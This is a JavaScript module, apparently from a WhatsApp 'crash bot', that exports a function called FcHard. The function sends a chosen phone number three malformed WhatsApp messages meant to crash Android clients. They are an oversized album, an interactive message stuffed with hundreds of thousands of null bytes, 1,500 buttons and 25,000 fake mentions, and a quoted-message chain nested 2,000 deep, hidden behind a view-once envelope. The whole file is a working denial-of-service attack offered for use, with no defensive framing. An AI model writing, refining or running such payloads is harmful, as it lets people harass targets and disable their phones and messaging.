const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function FcHard(sock, target, durationHours = 500) {
    if (!sock || !target) {
        console.log('[FcHard] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const firstTarget = Array.isArray(target) ? target[0] : target;
        const targetNum = String(firstTarget).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[FcHard] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    let targetJid = String(Array.isArray(target) ? target[0] : target).trim();
    if (!targetJid.includes('@')) {
        targetJid = targetJid.replace(/\D/g, '') + '@s.whatsapp.net';
    }

    // ==================================================================
    // ANDROID HARD CRASH — MAX INTENSITY
    // Multiple simultaneous attack vectors in one payload:
    //   1. Album message with 800 children → Android gallery renderer OOM
    //   2. interactiveMessage with 200k+ char header/body → text layer OOM
    //   3. nativeFlowMessage with 1500 buttons → buttons parser recursion
    //   4. mentionedJid 25000 fake JIDs → contacts resolver flood
    //   5. messageParamsJson with nested offer/sheet/carousel → billing crash
    //   6. contextInfo forwardingScore overflow → forward renderer crash
    //   7. viewOnceMessage envelope → invisible (no chat preview)
    // ==================================================================

    const BIG = 200000;   // string repeat base
    const HUGE = 800;     // album children count
    const BTN  = 1500;    // buttons count
    const MENT = 25000;   // mentioned JIDs count

    // ---- Vector 1: Album bomb (Android specific) ----
    const albumBomb = {
        albumMessage: {
            expectedImageCount: HUGE,
            expectedVideoCount: 0,
            contextInfo: {
                forwardingScore: 999999,
                isForwarded: true
            }
        }
    };

    // ---- Vector 2+3+4+5+6: interactive bomb ----
    const interactiveBomb = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\u0000".repeat(BIG) + "𑇂𑆵𑆴𑆿".repeat(BIG),
                        subtitle: "\u0000".repeat(BIG) + "ᅠ".repeat(BIG),
                        hasMediaAttachment: false
                    },
                    body: {
                        text:
                            "\u0000".repeat(BIG) +
                            "𑇂𑆵𑆴𑆿".repeat(BIG) +
                            "ᅠ".repeat(BIG) +
                            "\u0300".repeat(BIG)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: BTN }, (_, i) => ({
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "ᅠ".repeat(800) + i,
                                id: "\u0000".repeat(800)
                            })
                        })),
                        messageParamsJson: JSON.stringify({
                            limited_time_offer: {
                                text: "\u0000".repeat(BIG),
                                url: "https://x".repeat(50000),
                                copy_code: "A".repeat(BIG),
                                expiration_time: 9999999999
                            },
                            bottom_sheet: {
                                text: "B".repeat(BIG),
                                in_thread_buttons_limit: BTN,
                                list_title: "C".repeat(BIG),
                                button_title: "D".repeat(BIG)
                            },
                            carousel: {
                                cards: Array.from({ length: 200 }, () => ({
                                    header: { title: "\u0000".repeat(2000) },
                                    body: { text: "\u0000".repeat(2000) },
                                    buttons: Array.from({ length: 10 }, () => ({
                                        name: "quick_reply",
                                        buttonParamsJson: "E".repeat(500)
                                    }))
                                }))
                            }
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: MENT }, (_, i) =>
                            "\u0000".repeat(5) + i + "@s.whatsapp.net"
                        ),
                        forwardingScore: 2147483647,
                        isForwarded: true,
                        expiration: 0,
                        ephemeralSettingTimestamp: 0,
                        participant: targetJid
                    }
                }
            }
        }
    };

    // ---- Vector 7: nested quoted bomb ----
    // Deeply nested quoted messages — Android recursive parser stack overflow
    const nestBomb = (depth) => {
        let q = { conversation: "\u0000".repeat(5000) };
        for (let i = 0; i < depth; i++) {
            q = {
                extendedTextMessage: {
                    text: "\u0000".repeat(5000),
                    contextInfo: { quotedMessage: q }
                }
            };
        }
        return q;
    };

    const quotedBomb = {
        extendedTextMessage: {
            text: "\u0000".repeat(BIG),
            contextInfo: {
                stanzaId: crypto.randomBytes(16).toString('hex'),
                remoteJid: targetJid,
                quotedMessage: nestBomb(2000)
            }
        }
    };

    // ---- Fire all vectors sequentially ----
    const vectors = [
        { name: 'album',      payload: albumBomb },
        { name: 'interactive', payload: interactiveBomb },
        { name: 'quoted',     payload: quotedBomb },
    ];

    for (const v of vectors) {
        try {
            await sock.relayMessage(targetJid, v.payload, {
                messageId: 'FcHard-' + v.name + '-' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex'),
                noSelfSync: true,
                additionalAttributes: {},
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: []
                    }]
                }]
            });
            console.log('[FcHard] sent vector:', v.name);
        } catch (relayErr) {
            console.log('[FcHard relay ' + v.name + ']', (relayErr && relayErr.message) ? relayErr.message : relayErr);
        }
        // small gap between vectors so backend processes each fully
        await new Promise(r => setTimeout(r, 300));
    }
}

module.exports = { FcHard };
